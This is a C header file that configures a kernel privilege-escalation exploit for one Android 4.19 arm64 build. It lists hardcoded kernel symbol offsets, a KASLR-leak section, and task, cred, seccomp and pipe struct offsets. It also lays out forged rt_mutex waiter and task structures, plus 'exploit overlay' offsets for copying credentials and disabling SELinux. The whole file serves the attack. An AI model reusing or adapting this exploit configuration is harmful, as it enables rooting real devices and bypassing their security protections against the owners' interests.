#ifndef TARGET_H
#define TARGET_H

#define BUILD_VARIANT_LABEL "ghostlock_k419"
#define BUILD_FINGERPRINT "android/ghostlock_k419"

/* Kernel address space — 4.19 arm64 Android (VA_BITS=39) */
#define KIMAGE_TEXT_BASE 0xffffff8008000000ULL
#define P0_PAGE_OFFSET 0xffffff8000000000ULL
#define P0_PHYS_OFFSET 0x80000000ULL
#define P0_KERNEL_PHYS_LOAD 0  /* unknown, resolved at runtime via kallsyms */

/* Direct map / physmap range */
#define KERNELSNITCH_IDENTITY_START 0xffffff8000000000ULL
#define KERNELSNITCH_IDENTITY_END   0xffffffc000000000ULL
#define DIRECT_MAP_BASE 0xffffff8000000000ULL
#define DIRECT_MAP_END 0xffffffc000000000ULL
#define VMEMMAP_START 0xfffffffe00000000ULL

/* Global symbol offsets (kallsyms extracted from kernel.elf) */
#define INIT_TASK_OFF          0x2E00000ULL
#define INIT_CRED_OFF          0ULL  /* resolved via kallsyms_lookup_name */
#define INIT_UTS_NS_OFF        0x2E1FFC8ULL
#define EMPTY_ZERO_PAGE_OFF    0x30EB000ULL
#define ROOT_TASK_GROUP_OFF    0x30F21C0ULL
#define SELINUX_ENFORCING_OFF  0x2550420ULL  /* selinux_state */
#define KPTR_RESTRICT_OFF      0ULL  /* resolved via kallsyms_lookup_name */
#define CAP_CAPABLE_ACTIVE_OFF 0ULL  /* resolved via kallsyms_lookup_name */
#define KPTR_RESTRICT          0ULL

#define SELINUX_BLOB_SIZES_OFF  0ULL
#define SECURITY_HOOK_HEADS_OFF 0x254FD90ULL
#define KMALLOC_CACHES_OFF      0x254F880ULL
#define ANON_PIPE_BUF_OPS_OFF   0x1D79200ULL

/* UMH root: not available for 4.19 (no call_usermodehelper_exec_work symbol) */
#define SYSTEM_UNBOUND_WQ_OFF           0x2E0DC00ULL
#define CALL_USERMODEHELPER_EXEC_WORK_OFF 0ULL

/* Ashmem (Android shared memory) */
#define ASHMEM_MISC_FOPS_OFF       0ULL
#define ASHMEM_FOPS_OFF            0x1EF0B10ULL
#define ASHMEM_IOCTL_OFF           0xE406F0ULL
#define ASHMEM_COMPAT_IOCTL_OFF    0ULL
#define ASHMEM_MMAP_OFF            0xE40E70ULL
#define ASHMEM_OPEN_OFF            0xE40FE0ULL
#define ASHMEM_RELEASE_OFF         0xE41070ULL
#define ASHMEM_SHOW_FDINFO_OFF     0xE410F8ULL

/* Configfs — not available in 4.19 Android kernel */
#define CONFIGFS_READ_ITER_OFF      0ULL
#define CONFIGFS_BIN_WRITE_ITER_OFF 0ULL
#define COPY_SPLICE_READ_OFF        0x346C28ULL  /* generic_file_splice_read */
#define NOOP_LLSEEK_OFF             0x3020D8ULL

/* KASLR leak */
#define SLIDE_NFULNL_LOGGER_OFF       0x2E165A8ULL
#define SLIDE_LOGGERS_0_1_OFF         0ULL  /* resolved via kallsyms */
#define SLIDE_RANDOM_BOOT_ID_DATA_OFF 0ULL  /* resolved via kallsyms */
#define SLIDE_SYSCTL_BOOTID_OFF       0ULL  /* resolved via kallsyms */

/* Derived macros */
#define INIT_TASK           (KIMAGE_TEXT_BASE + INIT_TASK_OFF)
#define INIT_CRED           (KIMAGE_TEXT_BASE + INIT_CRED_OFF)  /* 0 = runtime resolve */
#define INIT_UTS_NS         (KIMAGE_TEXT_BASE + INIT_UTS_NS_OFF)
#define EMPTY_ZERO_PAGE     (KIMAGE_TEXT_BASE + EMPTY_ZERO_PAGE_OFF)
#define ROOT_TASK_GROUP     (KIMAGE_TEXT_BASE + ROOT_TASK_GROUP_OFF)
#define SELINUX_ENFORCING   (KIMAGE_TEXT_BASE + SELINUX_ENFORCING_OFF)
#define SELINUX_BLOB_SIZES  (KIMAGE_TEXT_BASE + SELINUX_BLOB_SIZES_OFF)
#define SECURITY_HOOK_HEADS (KIMAGE_TEXT_BASE + SECURITY_HOOK_HEADS_OFF)
#define KMALLOC_CACHES      (KIMAGE_TEXT_BASE + KMALLOC_CACHES_OFF)
#define ANON_PIPE_BUF_OPS   (KIMAGE_TEXT_BASE + ANON_PIPE_BUF_OPS_OFF)
#define ASHMEM_MISC_FOPS    (KIMAGE_TEXT_BASE + ASHMEM_MISC_FOPS_OFF)
#define ASHMEM_FOPS         (KIMAGE_TEXT_BASE + ASHMEM_FOPS_OFF)
#define ASHMEM_IOCTL        (KIMAGE_TEXT_BASE + ASHMEM_IOCTL_OFF)
#define ASHMEM_COMPAT_IOCTL (KIMAGE_TEXT_BASE + ASHMEM_COMPAT_IOCTL_OFF)
#define ASHMEM_MMAP         (KIMAGE_TEXT_BASE + ASHMEM_MMAP_OFF)
#define ASHMEM_OPEN         (KIMAGE_TEXT_BASE + ASHMEM_OPEN_OFF)
#define ASHMEM_RELEASE      (KIMAGE_TEXT_BASE + ASHMEM_RELEASE_OFF)
#define ASHMEM_SHOW_FDINFO  (KIMAGE_TEXT_BASE + ASHMEM_SHOW_FDINFO_OFF)
#define CONFIGFS_READ_ITER      (KIMAGE_TEXT_BASE + CONFIGFS_READ_ITER_OFF)
#define CONFIGFS_BIN_WRITE_ITER (KIMAGE_TEXT_BASE + CONFIGFS_BIN_WRITE_ITER_OFF)
#define COPY_SPLICE_READ    (KIMAGE_TEXT_BASE + COPY_SPLICE_READ_OFF)
#define NOOP_LLSEEK         (KIMAGE_TEXT_BASE + NOOP_LLSEEK_OFF)
#define SLIDE_NFULNL_LOGGER_IMAGE       (KIMAGE_TEXT_BASE + SLIDE_NFULNL_LOGGER_OFF)
#define SLIDE_LOGGERS_0_1_IMAGE         (KIMAGE_TEXT_BASE + SLIDE_LOGGERS_0_1_OFF)
#define SLIDE_RANDOM_BOOT_ID_DATA_IMAGE (KIMAGE_TEXT_BASE + SLIDE_RANDOM_BOOT_ID_DATA_OFF)
#define SLIDE_INIT_TASK_IMAGE           (KIMAGE_TEXT_BASE + INIT_TASK_OFF)
#define SLIDE_ROOT_TASK_GROUP_IMAGE     (KIMAGE_TEXT_BASE + ROOT_TASK_GROUP_OFF)
#define SLIDE_SYSCTL_BOOTID_IMAGE       (KIMAGE_TEXT_BASE + SLIDE_SYSCTL_BOOTID_OFF)

#define PSELECT_WAITER_WORD_SHIFT 0

/* rt_mutex_waiter struct offsets for 4.19 arm64:
 * tree_entry: 0x00-0x17 (3x8 = 24 bytes: __rb_parent_color, rb_right, rb_left)
 * pi_tree_entry: 0x18-0x2F (24 bytes)
 * task: 0x30
 * lock: 0x38
 * prio: 0x40
 * ww_ctx: 0x48 */
#define WAITER_LOCAL_OFF          0x80
#define WAITER_TREE_ENTRY_OFF     0x00
#define WAITER_PI_TREE_ENTRY_OFF  0x18
#define WAITER_TASK_OFF           0x30
#define WAITER_LOCK_OFF           0x38
#define WAITER_WAKE_STATE_OFF     0x50
#define WAITER_PRIO_OFF           0x40
#define WAITER_DEADLINE_OFF       0x44
#define WAITER_WW_CTX_OFF         0x48

#define FAKE_WAITER_TREE_PRIO_OFF         0x18
#define FAKE_WAITER_TREE_DEADLINE_OFF     0x20
#define FAKE_WAITER_PI_TREE_ENTRY_OFF     0x18
#define FAKE_WAITER_PI_TREE_PRIO_OFF      0x30
#define FAKE_WAITER_PI_TREE_DEADLINE_OFF  0x38
#define FAKE_WAITER_TASK_OFF              0x30
#define FAKE_WAITER_LOCK_OFF              0x38
#define FAKE_WAITER_WAKE_STATE_OFF        0x50
#define FAKE_WAITER_WW_CTX_OFF            0x48

/* task_struct offsets for 4.19 arm64 */
#define FAKE_TASK_USAGE_OFF          0x40
#define FAKE_TASK_PRIO_OFF           0xAC
#define FAKE_TASK_NORMAL_PRIO_OFF    0xB4
#define FAKE_TASK_TASK_GROUP_OFF     0x418
#define FAKE_TASK_PI_LOCK_OFF        0x8B8
#define FAKE_TASK_PI_WAITERS_OFF     0x8CC
#define FAKE_TASK_PI_TOP_TASK_OFF    0x8DC
#define FAKE_TASK_PI_BLOCKED_ON_OFF  0x8E4

#define MM_OWNER_OFF             0x350
#define TASK_PID_OFF             0x5D4
#define TASK_TGID_OFF            0x5D8
#define TASK_REAL_PARENT_OFF     0x5E0
#define TASK_ATOMIC_FLAGS_OFF    0x598
#define TASK_REAL_CRED_OFF       0x780
#define TASK_CRED_OFF            0x788
#define TASK_COMM_OFF            0x798
#define TASK_TASKS_OFF           0x4D0
#define TASK_THREAD_INFO_FLAGS_OFF 0x00
#define TASK_SECCOMP_OFF         0x850

/* cred struct offsets (same across versions) */
#define CRED_UID_OFF         8
#define CRED_SECUREBITS_OFF  40
#define CRED_CAPS_OFF        48
#define CRED_SECURITY_OFF    128
#define SELINUX_CRED_BLOB_OFF  0
#define SELINUX_CRED_OSID_OFF  0
#define SELINUX_CRED_SID_OFF   4
#define SECCOMP_MODE_OFF          0x00
#define SECCOMP_FILTER_COUNT_OFF  0x04
#define SECCOMP_FILTER_OFF        0x08
#define TIF_SECCOMP_BIT           11
#define PFA_NO_NEW_PRIVS_BIT      0

/* Page/slab struct offsets */
#define STRUCT_PAGE_SIZE              0x40
#define STRUCT_PAGE_COMPOUND_HEAD_OFF 0x08
#define STRUCT_SLAB_CACHE_OFF         0x08
#define STRUCT_PAGE_TYPE_OFF          0x30

/* Pipe struct offsets */
#define PIPE_BUFFER_SIZE         0x28
#define PIPE_BUFFER_SLOTS        32
#define PIPE_BUF_FLAG_CAN_MERGE  0x10
#define PIPE_INODE_INFO_STRUCT_SIZE   0xB8
#define PIPE_INODE_INFO_SIZE          0xC0
#define PIPE_INODE_INFO_SLOTS_PER_PAGE 21
#define PIPE_HEAD_OFF                 0x60
#define PIPE_TAIL_OFF                 0x64
#define PIPE_MAX_USAGE_OFF            0x68
#define PIPE_RING_SIZE_OFF            0x6C
#define PIPE_NR_ACCOUNTED_OFF         0x70
#define PIPE_READERS_OFF              0x74
#define PIPE_WRITERS_OFF              0x78
#define PIPE_FILES_OFF                0x7C
#define PIPE_TMP_PAGE_OFF             0x90
#define PIPE_BUFS_OFF                 0xA8
#define PIPE_USER_OFF                 0xB0

/* file_operations offsets */
#define FOPS_OWNER_OFF        0x00
#define FOPS_LLSEEK_OFF       0x10
#define FOPS_READ_OFF         0x18
#define FOPS_WRITE_OFF        0x20
#define FOPS_READ_ITER_OFF    0x28
#define FOPS_WRITE_ITER_OFF   0x30
#define FOPS_IOCTL_OFF        0x50
#define FOPS_COMPAT_IOCTL_OFF 0x58
#define FOPS_MMAP_OFF         0x60
#define FOPS_OPEN_OFF         0x68
#define FOPS_RELEASE_OFF      0x78
#define FOPS_SPLICE_READ_OFF  0xB8
#define FOPS_SHOW_FDINFO_OFF  0xD8

/* Exploit overlay offsets */
#define LOCK_OFF      0x0E80
#define W0_OFF        0x1180
#define FOPS_OFF      0x0F80
#define SCRATCH_OFF   0x1200
#define RIGHT_OFF     0x1240
#define LEFT_OFF      0x1260
#define FAKE_TASK_OFF 0x1280
#define CFG_PAGE_OFF            16
#define CFG_NEEDS_READ_FILL_OFF 80
#define CFG_BIN_BUFFER_OFF      88
#define CFG_BIN_BUFFER_SIZE_OFF 96
#define CFG_CB_MAX_SIZE_OFF     100
#define CRED_COPY_OFF 0x1080

#endif

/* SLIDE mode */
#define SLIDE_PSELECT_WORD_SHIFT 2
#define SLIDE_PSELECT_NFDS 320
#define SLIDE_USE_SELECT 1